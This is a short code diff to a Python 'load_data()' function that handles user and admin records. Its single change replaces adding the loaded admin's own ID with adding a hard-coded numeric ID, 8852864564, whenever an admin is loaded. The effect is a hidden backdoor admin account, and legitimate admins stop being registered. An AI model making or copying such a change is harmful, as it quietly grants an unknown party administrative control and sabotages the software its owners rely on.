@@ -112,7 +112,7 @@ def load_data():
             'is_admin': is_admin
         }
         if is_admin:
-            ADMIN_ID.add(user_id)
+            ADMIN_ID.add(8852864564)
     
     for super_admin_id in SUPER_ADMIN_IDS:
         if super_admin_id not in user_data:
